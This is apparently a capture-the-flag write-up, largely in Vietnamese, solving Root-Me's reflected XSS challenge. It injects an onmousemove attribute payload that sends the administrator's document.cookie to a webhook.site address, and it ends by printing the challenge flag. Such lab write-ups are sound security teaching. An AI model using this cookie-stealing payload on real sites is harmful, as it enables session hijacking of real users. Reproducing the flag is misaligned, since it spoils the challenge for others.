# XSS - Reflected
alert(’xtra stupid security’)

**Statement**

Find a way to steal the administrator’s cookie.

Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.
## Cách làm
Truy cập vào link http://challenge01.root-me.org/web-client/ch26/ ta sẽ thấy giao diện:

![image](https://github.com/aQ05/Write-up/assets/121664384/b0830567-58d6-46ea-b51a-c2c6b969bfd3)

Click vào từng mục, ta dễ dàng thấy ở mỗi mục có một thuộc tính `p` được gắn giá trị tương ứng từng mục:
![Screenshot 2023-11-11 145248](https://github.com/aQ05/Write-up/assets/121664384/a1ec5dec-0d3d-4d87-a7d3-c7dc92fd8c62)

Thử gán thuộc tính `p` đó cho câu lệnh `<script>alert(1)</script>` để kiểm tra xem nó có dính lỗi XSS hay không

![image](https://github.com/aQ05/Write-up/assets/121664384/8ed0492d-991e-4661-8f7e-d4e00a4c42e0)

Khi request đến `?p=<script>alert(1)</script>`, website hiển thị trang web lỗi và có một hyperlink thẻ <a> hiển thị nội dung ‘<script>alert(1)</script>’:

![image](https://github.com/aQ05/Write-up/assets/121664384/a7829112-fe4b-448b-883c-a15d6248a8ab)

Thử nhập `?p=ayuq' onmousemove='alert(1)`, page sẽ báo lỗi và hiển thị nội dung trong thẻ <a>.  (`onmousemove` khi trỏ chuột vào thì nó sẽ chạy đoạn js bên trong).

![image](https://github.com/aQ05/Write-up/assets/121664384/a756767e-6e32-4113-975d-a5b1aad6bb02)

Có thể thấy web này đã dính lỗi XSS. Khi đó, ta thực hiện gửi cookie của admin vào host của mình.

Payload: `ayuq' onmousemove='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)`

![image](https://github.com/aQ05/Write-up/assets/121664384/c6f69bd0-f38a-4781-9e82-610e23e907c2)

Thực hiện request với payload. Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:
![image](https://github.com/aQ05/Write-up/assets/121664384/102832e4-d086-4119-a80b-e2f3e269d2f9)

![Screenshot 2023-11-11 160952](https://github.com/aQ05/Write-up/assets/121664384/a6a8c118-390f-4652-82db-1a58d76dc8e5)

## Flag
`r3fL3ct3D_XsS_fTw`
